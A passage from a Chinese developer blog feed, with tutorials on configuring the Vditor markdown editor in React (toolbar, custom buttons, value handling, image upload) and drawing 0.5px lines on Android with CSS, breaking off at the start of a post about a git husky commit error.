keyword">const</span> vditor <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vditor</span><span class="token punctuation">(</span><span class="token string">"vditor"</span><span class="token punctuation">,</span> <span class="token operator">...</span>option<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>新建对象时第一个参数ID，要对应上再render里面注入的ID</p><h3 id="option参数"><a href="#option参数" class="headerlink" title="option参数"></a>option参数</h3><blockquote><p>tip：只列举一下常用参数，其他的参数请参照<a href="https://ld246.com/article/1549638745630" target="_blank" rel="noopener">官方API</a></p></blockquote><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td>height</td><td>配置编辑器高度</td></tr><tr><td>mode</td><td>编辑器模式<br>wysiwyg：所见即所得2<br>ir:及时渲染<br>sv：分屏模式</td></tr><tr><td>placeholder</td><td>占位符</td></tr><tr><td>toolbar</td><td>工具栏</td></tr></tbody></table><blockquote><p>Tip：如果要自定义工具栏的话，一定要加上默认的工具栏，不然只展示自定义的了</p></blockquote><h3 id="默认工具栏"><a href="#默认工具栏" class="headerlink" title="默认工具栏"></a>默认工具栏</h3><blockquote><p>tip：此为源码里面copy 不用更改可直接使用，官方已定义好了快捷键和功能</p></blockquote><pre class="line-numbers language-js"><code class="language-js">toolbar<span class="token punctuation">:</span> <span class="token punctuation">[</span>            <span class="token string">"emoji"</span><span class="token punctuation">,</span>            <span class="token string">"headings"</span><span class="token punctuation">,</span>            <span class="token string">"bold"</span><span class="token punctuation">,</span>            <span class="token string">"italic"</span><span class="token punctuation">,</span>            <span class="token string">"strike"</span><span class="token punctuation">,</span>            <span class="token string">"link"</span><span class="token punctuation">,</span>            <span class="token string">"|"</span><span class="token punctuation">,</span>            <span class="token string">"list"</span><span class="token punctuation">,</span>            <span class="token string">"ordered-list"</span><span class="token punctuation">,</span>            <span class="token string">"check"</span><span class="token punctuation">,</span>            <span class="token string">"outdent"</span><span class="token punctuation">,</span>            <span class="token string">"indent"</span><span class="token punctuation">,</span>            <span class="token string">"|"</span><span class="token punctuation">,</span>            <span class="token string">"quote"</span><span class="token punctuation">,</span>            <span class="token string">"line"</span><span class="token punctuation">,</span>            <span class="token string">"code"</span><span class="token punctuation">,</span>            <span class="token string">"inline-code"</span><span class="token punctuation">,</span>            <span class="token string">"insert-before"</span><span class="token punctuation">,</span>            <span class="token string">"insert-after"</span><span class="token punctuation">,</span>            <span class="token string">"|"</span><span class="token punctuation">,</span>            <span class="token string">"upload"</span><span class="token punctuation">,</span>            <span class="token string">"record"</span><span class="token punctuation">,</span>            <span class="token string">"table"</span><span class="token punctuation">,</span>            <span class="token string">"|"</span><span class="token punctuation">,</span>            <span class="token string">"undo"</span><span class="token punctuation">,</span>            <span class="token string">"redo"</span><span class="token punctuation">,</span>            <span class="token string">"|"</span><span class="token punctuation">,</span>            <span class="token string">"fullscreen"</span><span class="token punctuation">,</span>            <span class="token string">"edit-mode"</span><span class="token punctuation">,</span>            <span class="token punctuation">{</span>                name<span class="token punctuation">:</span> <span class="token string">"more"</span><span class="token punctuation">,</span>                toolbar<span class="token punctuation">:</span> <span class="token punctuation">[</span>                    <span class="token string">"both"</span><span class="token punctuation">,</span>                    <span class="token string">"code-theme"</span><span class="token punctuation">,</span>                    <span class="token string">"content-theme"</span><span class="token punctuation">,</span>                    <span class="token string">"export"</span><span class="token punctuation">,</span>                    <span class="token string">"outline"</span><span class="token punctuation">,</span>                    <span class="token string">"preview"</span><span class="token punctuation">,</span>                    <span class="token string">"devtools"</span><span class="token punctuation">,</span>                    <span class="token string">"info"</span><span class="token punctuation">,</span>                    <span class="token string">"help"</span><span class="token punctuation">,</span>                <span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token punctuation">}</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对应工具栏展示：  </p><p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glz2yp40u0j30ky018748.jpg" alt="image-20201224173651841">  </p><h3 id="自定义按钮"><a href="#自定义按钮" class="headerlink" title="自定义按钮"></a>自定义按钮</h3><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">let</span> that <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">;</span><span class="token keyword">const</span> vditor <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vditor</span><span class="token punctuation">(</span><span class="token string">"vditor"</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>    toolbar<span class="token punctuation">:</span> <span class="token punctuation">[</span>        <span class="token punctuation">{</span>            hotkey<span class="token punctuation">:</span> <span class="token string">"⌘-S"</span><span class="token punctuation">,</span>            name<span class="token punctuation">:</span> <span class="token string">"save"</span><span class="token punctuation">,</span>            tipPosition<span class="token punctuation">:</span> <span class="token string">"s"</span><span class="token punctuation">,</span>            tip<span class="token punctuation">:</span> <span class="token string">"保存"</span><span class="token punctuation">,</span>            className<span class="token punctuation">:</span> <span class="token string">"right"</span><span class="token punctuation">,</span>            icon<span class="token punctuation">:</span> <span class="token template-string"><span class="token string">`&lt;img style="height: 16px" src='https://img.58cdn.com.cn/escstatic/docs/imgUpload/idocs/save.svg'/>`</span></span><span class="token punctuation">,</span>            <span class="token function">click</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                that<span class="token punctuation">.</span><span class="token function">saveDoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span>        <span class="token punctuation">{</span>            hotkey<span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">,</span>            name<span class="token punctuation">:</span> <span class="token string">"publish"</span><span class="token punctuation">,</span>            tipPosition<span class="token punctuation">:</span> <span class="token string">"s"</span><span class="token punctuation">,</span>            tip<span class="token punctuation">:</span> <span class="token string">"发布文章"</span><span class="token punctuation">,</span>            className<span class="token punctuation">:</span> <span class="token string">"right"</span><span class="token punctuation">,</span>            icon<span class="token punctuation">:</span> <span class="token template-string"><span class="token string">`&lt;img style="height: 16px" src='https://img.58cdn.com.cn/escstatic/docs/imgUpload/idocs/publish.svg'/>`</span></span><span class="token punctuation">,</span>            <span class="token function">click</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                that<span class="token punctuation">.</span><span class="token function">publishDoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//tip：在调用本类封装的方法时提前把this赋值给其他方法内的变量，在Vditor内部改变了this指向</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td>hotkey</td><td>热键配置</td></tr><tr><td>name</td><td>功能区分（唯一性）</td></tr><tr><td>tip</td><td>悬浮提示</td></tr><tr><td>className</td><td>UI展示 right靠右</td></tr><tr><td>icon</td><td>按钮图标</td></tr><tr><td>click</td><td>点击事件</td></tr></tbody></table><p>示例：  </p><p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glz3jgujupj30ls018gll.jpg" alt="image-20201224175653047">  </p><h3 id="获取值"><a href="#获取值" class="headerlink" title="获取值"></a>获取值</h3><pre class="line-numbers language-js"><code class="language-js">saveDoc <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">//在初始化时已经把vditor赋值到this对象上 可直接通过getValue方法获取当前编辑器的值</span>    <span class="token keyword">let</span> mdValue <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>vditor <span class="token operator">&amp;&amp;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>vditor<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//获取完值业务保存就行 这里不再详细写本人的保存方法了</span>  <span class="token operator">...</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="赋值"><a href="#赋值" class="headerlink" title="赋值"></a>赋值</h3><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">let</span> <span class="token punctuation">{</span> value <span class="token punctuation">}</span> <span class="token operator">=</span> params<span class="token punctuation">;</span>value <span class="token operator">=</span> value <span class="token operator">?</span> value <span class="token punctuation">:</span> <span class="token string">" "</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//如果是空值的话 最好给一个空格 以免编辑器初始化时报错</span><span class="token keyword">const</span> vditor <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vditor</span><span class="token punctuation">(</span><span class="token string">"vditor"</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// value: value,</span>  <span class="token function">after</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      vditor<span class="token punctuation">.</span><span class="token function">setValue</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//tip：虽说官方也提供value直接赋值 但是在React里面不生效，就需要在after里面去调用setValue来完成赋值</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="自定义图片上传"><a href="#自定义图片上传" class="headerlink" title="自定义图片上传"></a>自定义图片上传</h3><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">const</span> vditor <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vditor</span><span class="token punctuation">(</span><span class="token string">"vditor"</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>  upload<span class="token punctuation">:</span> <span class="token punctuation">{</span>      accept<span class="token punctuation">:</span> <span class="token string">"image/*"</span><span class="token punctuation">,</span>      multiple<span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>      <span class="token function">filename</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token punctuation">{</span>          <span class="token keyword">return</span> name              <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/[^(a-zA-Z0-9\u4e00-\u9fa5\.)]/g</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span>              <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/[\?\\/:|&lt;>\*\[\]\(\)\$%\{\}@~]/g</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span>              <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"/\\s/g"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span><span class="token punctuation">,</span>      <span class="token function">handler</span><span class="token punctuation">(</span>files<span class="token punctuation">)</span> <span class="token punctuation">{</span>          <span class="token keyword">function</span> <span class="token function">callback</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span> <span class="token punctuation">{</span>              <span class="token keyword">let</span> name <span class="token operator">=</span> files<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> files<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>name<span class="token punctuation">;</span>              <span class="token keyword">let</span> succFileText <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>              <span class="token keyword">if</span> <span class="token punctuation">(</span>vditor <span class="token operator">&amp;&amp;</span> vditor<span class="token punctuation">.</span>vditor<span class="token punctuation">.</span>currentMode <span class="token operator">===</span> <span class="token string">"wysiwyg"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                  succFileText <span class="token operator">+</span><span class="token operator">=</span> <span class="token template-string"><span class="token string">`\n &lt;img alt=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>name<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string"> src="</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>path<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">">`</span></span><span class="token punctuation">;</span>              <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                  succFileText <span class="token operator">+</span><span class="token operator">=</span> <span class="token template-string"><span class="token string">`  \n![</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>name<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">](</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>path<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">)`</span></span><span class="token punctuation">;</span>              <span class="token punctuation">}</span>              document<span class="token punctuation">.</span><span class="token function">execCommand</span><span class="token punctuation">(</span><span class="token string">"insertHTML"</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> succFileText<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>          that<span class="token punctuation">.</span><span class="token function">handleImageUpload</span><span class="token punctuation">(</span>files<span class="token punctuation">,</span> callback<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span><span class="token punctuation">,</span>      <span class="token function">url</span><span class="token punctuation">(</span>files<span class="token punctuation">,</span> callback<span class="token punctuation">)</span> <span class="token punctuation">{</span>          that<span class="token punctuation">.</span><span class="token function">handleImageUpload</span><span class="token punctuation">(</span>files<span class="token punctuation">,</span> callback<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//此接口里面调用的是自己的图片上传 业务方自行实现</span>handleImageUpload <span class="token operator">=</span> <span class="token punctuation">(</span>file<span class="token punctuation">,</span> callback<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> reader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileReader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> formdata <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FormData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    formdata<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"files"</span><span class="token punctuation">,</span> file<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    reader<span class="token punctuation">.</span>onload <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// setTimeout 模拟异步上传图片</span>        <span class="token comment" spellcheck="true">// 当异步上传获取图片地址后，执行callback回调（参数为imageUrl字符串），即可将图片地址写入markdown</span>        <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span>resolve <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>props<span class="token punctuation">.</span><span class="token function">dispatch</span><span class="token punctuation">(</span><span class="token punctuation">{</span>                type<span class="token punctuation">:</span> <span class="token string">"docManager/imageUpload"</span><span class="token punctuation">,</span>                payload<span class="token punctuation">:</span> <span class="token punctuation">{</span> resolve<span class="token punctuation">,</span> username<span class="token punctuation">:</span> myInfo<span class="token punctuation">.</span>userId<span class="token punctuation">,</span> formdata <span class="token punctuation">}</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>res <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>            <span class="token keyword">let</span> imgurl <span class="token operator">=</span> res<span class="token punctuation">.</span>result<span class="token punctuation">.</span>path<span class="token punctuation">;</span>            <span class="token function">callback</span><span class="token punctuation">(</span>imgurl<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span>    reader<span class="token punctuation">.</span><span class="token function">readAsDataURL</span><span class="token punctuation">(</span>file<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td>accept</td><td>接收文件类型（我这边只做了图片上传）</td></tr><tr><td>multiple</td><td>是否多选</td></tr><tr><td>filename</td><td>格式化文件名</td></tr><tr><td>handler</td><td>点击数触发方法</td></tr><tr><td>url</td><td>配置此方法时可实现图片粘贴并上传</td></tr></tbody></table><h4 id="图片粘贴时读取的文件"><a href="#图片粘贴时读取的文件" class="headerlink" title="图片粘贴时读取的文件"></a>图片粘贴时读取的文件</h4><p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glz53id1egj30g20eidiy.jpg" alt="image-20201224185044916">   </p><h4 id="上传完成后接口返回的CDN地址"><a href="#上传完成后接口返回的CDN地址" class="headerlink" title="上传完成后接口返回的CDN地址"></a>上传完成后接口返回的CDN地址</h4><p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glz5j9ps4uj30lh0augp2.jpg" alt="image-20201224190546200">  </p><h4 id="上传完成后处理"><a href="#上传完成后处理" class="headerlink" title="上传完成后处理"></a>上传完成后处理</h4><pre class="line-numbers language-js"><code class="language-js"><span class="token function">handler</span><span class="token punctuation">(</span>files<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">function</span> <span class="token function">callback</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">let</span> name <span class="token operator">=</span> files<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> files<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>name<span class="token punctuation">;</span>        <span class="token keyword">let</span> succFileText <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//上传完成获取当前编辑器模式 根据不同模式拼接不同的展示标签</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>vditor <span class="token operator">&amp;&amp;</span> vditor<span class="token punctuation">.</span>vditor<span class="token punctuation">.</span>currentMode <span class="token operator">===</span> <span class="token string">"wysiwyg"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            succFileText <span class="token operator">+</span><span class="token operator">=</span> <span class="token template-string"><span class="token string">`\n &lt;img alt=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>name<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string"> src="</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>path<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">">`</span></span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            succFileText <span class="token operator">+</span><span class="token operator">=</span> <span class="token template-string"><span class="token string">`  \n![</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>name<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">](</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>path<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">)`</span></span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">//拼接完直接插入到鼠标选中位置</span>        document<span class="token punctuation">.</span><span class="token function">execCommand</span><span class="token punctuation">(</span><span class="token string">"insertHTML"</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> succFileText<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    that<span class="token punctuation">.</span><span class="token function">handleImageUpload</span><span class="token punctuation">(</span>files<span class="token punctuation">,</span> callback<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glz5meqw66j30l409r75w.jpg" alt="image-20201224190854846">  </p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>以上是本人在接入vditor编辑器是的一些使用总结，如果您还有什么更高级的定制玩法，可留言。</p>]]></content>
      
      
      <categories>
          
          <category> 工具类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> React </tag>
            
            <tag> Vditor </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android实现0.5像素线条</title>
      <link href="2020/12/02/Android%E5%AE%9E%E7%8E%B0%E5%8D%8A%E5%83%8F%E7%B4%A0%E7%BA%BF%E6%9D%A1/"/>
      <url>2020/12/02/Android%E5%AE%9E%E7%8E%B0%E5%8D%8A%E5%83%8F%E7%B4%A0%E7%BA%BF%E6%9D%A1/</url>
      
        <content type="html"><![CDATA[<p>由于安卓手机无法识别<code>border: 0.5px</code>，因此我们要用0.5px的话必须要借助css3中的<code>-webkit-transform:scale</code>缩放来实现。</p><p>原理：将伪元素的宽设为200%，height设为1px通过<code>-webkit-transform:scale（.5）</code>来进行缩小一倍，这样就得到border为0.5的边框</p><pre class="line-numbers language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>width<span class="token punctuation">=</span>device-width, initial-scale<span class="token punctuation">=</span>1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>X-UA-Compatible<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>ie<span class="token punctuation">=</span>edge<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Document<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style language-css">        <span class="token selector"><span class="token class">.div</span></span><span class="token punctuation">{</span>            <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">100%</span><span class="token punctuation">;</span>            <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">100</span>px<span class="token punctuation">;</span>            <span class="token property">border-top</span><span class="token punctuation">:</span> <span class="token number">1</span>px solid aqua<span class="token punctuation">;</span>            <span class="token property">posititon</span><span class="token punctuation">:</span>relative<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token selector"><span class="token class">.div</span><span class="token pseudo-element">::after</span></span><span class="token punctuation">{</span>            <span class="token property">content</span><span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">;</span>            <span class="token property">position</span><span class="token punctuation">:</span> absolute<span class="token punctuation">;</span>            <span class="token property">left</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token property">bottom</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token property">box-sizing</span><span class="token punctuation">:</span> border-box<span class="token punctuation">;</span>            <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">200%</span><span class="token punctuation">;</span>            <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">1</span>px<span class="token punctuation">;</span>            <span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">scale</span><span class="token punctuation">(</span><span class="token number">.5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token property">transform-origin</span><span class="token punctuation">:</span> <span class="token number">0</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token property">pointer-events</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span>            <span class="token property">background-color</span><span class="token punctuation">:</span> aqua<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>div<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span>Copy to clipboardErrorCopied<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>效果展示：</strong></p><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/custom/halfpx.png" alt="img">  </p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> css </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git commit husky报错</title>
      <link href="2020/11/10/git-commit-husky%E6%8A%A5%E9%94%99/"/>
      <url>2020/11/10/git-commit-husky%E6%8A%A5%E9%94%99/</url>
      
        <content type="html"><![CDATA[<h2 id="报错信息"><a href="#报错信息" class="headerlink" title="报错信息"></a>报错信息</h2><pre class="line-numbers language-js"><code class="language-js">➜  guchejia_web_app git<span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token number">5.1</span><span class="token punctuation">.</span><span class="token number">1</span><span class="token punctuation">)</span> ✗ git commit <span class="token operator">-</span>am <span class="token string">"[feat]: 修改弹窗"</span>Warning<span class="token punctuation">:</span> Setting commit<span class="token operator">-</span>msg script <span class="token keyword">in</span> <span class="token keyword">package</span><span class="token punctuation">.</span>json <span class="token operator">></span> scripts will be deprecatedPlease move it to husky<span class="token punctuation">.</span>hooks <span class="token keyword">in</span> <span class="token keyword">package</span><span class="token punctuation">.</span>json<span class="token punctuation">,</span> a <span class="token punctuation">.</span>huskyrc file<span class="token punctuation">,</span> or a husky<span class="token punctuation">.</span>config<span class="token punctuation">.</span>js fileOr run <span class="token punctuation">.</span><span class="token regex">/node_modules/</span><span class="token punctuation">.</span>bin<span class="token operator">/</span>husky<span class="token operator">-</span>upgrade <span class="token keyword">for</span> automatic updateSee https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>typicode<span class="token operator">/</span>husky <span class="token keyword">for</span> usagehusky <span class="token operator">></span> commit<span class="token operator">-</span>msg <span class="token punctuation">(</span>node v8<span class="token 